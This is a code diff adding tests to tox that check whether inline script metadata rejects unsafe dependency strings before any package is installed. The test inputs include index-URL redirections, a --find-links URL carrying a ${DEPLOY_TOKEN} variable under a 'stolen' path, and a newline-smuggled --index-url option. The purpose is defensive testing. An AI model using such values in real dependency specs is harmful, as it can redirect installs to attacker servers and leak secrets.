@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import json
 import sys
 from textwrap import dedent
 from typing import TYPE_CHECKING
@@ -127,6 +128,39 @@ def test_invalid_script_metadata(tox_project: ToxProjectCreator, script: str) ->
     result.assert_failed()
     assert "invalid inline script metadata" in result.out, result.out
     assert "internal error" not in result.out
+
+
+@pytest.mark.parametrize(
+    "dependency",
+    [
+        pytest.param("-i http://127.0.0.1:18931/simple", id="index-url"),
+        pytest.param("--extra-index-url http://127.0.0.1:18931/simple", id="long-option"),
+        pytest.param("--find-links http://127.0.0.1:18931/stolen/${DEPLOY_TOKEN}/", id="option-with-env-var"),
+        pytest.param("-e .", id="editable"),
+        pytest.param("demo-pkg\n--index-url http://127.0.0.1:18931/simple", id="line-break"),
+        pytest.param(42, id="non-string"),
+    ],
+)
+def test_invalid_dependency_fails_before_install(tox_project: ToxProjectCreator, dependency: object) -> None:
+    script = f"# /// script\n# dependencies = {json.dumps(['demo-pkg', dependency])}\n# ///\nprint('ok')\n"
+    result, execute_calls = _run(tox_project, {"tox.ini": _tox_ini(), "check.py": script})
+    result.assert_failed(1)
+    assert "invalid dependenc" in result.out, result.out
+    assert "internal error" not in result.out
+    assert not [i for i in execute_calls.call_args_list if "install" in i[0][3].run_id]
+
+
+def test_pep508_dependency_forms(tox_project: ToxProjectCreator) -> None:
+    dependencies = [
+        "demo-pkg>=1.0",
+        "demo-pkg @ https://example.com/demo_pkg-1.0-py3-none-any.whl",
+        "tomli; python_version < '3.11'",
+    ]
+    script = f"# /// script\n# dependencies = {json.dumps(dependencies)}\n# ///\nprint('ok')\n"
+    result, execute_calls = _run(tox_project, {"tox.ini": _tox_ini(), "check.py": script})
+    result.assert_success()
+    install_cmds = [i[0][3].cmd for i in execute_calls.call_args_list if "install" in i[0][3].run_id]
+    assert any("tomli" in arg for cmd in install_cmds for arg in cmd)
 
 
 def test_missing_script_file(tox_project: ToxProjectCreator) -> None:
